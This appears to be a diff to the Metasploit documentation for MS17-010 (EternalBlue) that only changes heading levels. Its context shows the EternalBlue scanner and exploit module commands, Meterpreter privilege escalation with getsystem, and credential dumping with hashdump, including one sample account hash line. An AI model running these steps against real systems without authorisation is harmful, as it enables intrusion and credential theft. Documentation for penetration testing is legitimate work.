@@ -60,14 +60,14 @@ Console options:
 
 ### Meterpreter examples
 
-#### getsystem
+### getsystem
 
 ```plain
 meterpreter > getsystem
 ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
 ```
 
-#### hashdump
+### hashdump
 
 ```plain
 meterpreter > hashdump
@@ -86,13 +86,13 @@ janedo:1110:aad3b435b51404eeaad3b435b51404ee:f3fe13546c4c0d2db443a0865626203b:::
 
 {{%attachments title="Related files" fa_icon_class="far fa-file-video" pattern="ms17-010.*(mp4)"/%}}
 
-#### Scanner
+### Scanner
 
 ```plain
 msf5 > use auxiliary/scanner/smb/smb_ms17_010
 ```
 
-#### Exploit
+### Exploit
 
 ```plain
 msf5 > use exploit/windows/smb/ms17_010_eternalblue
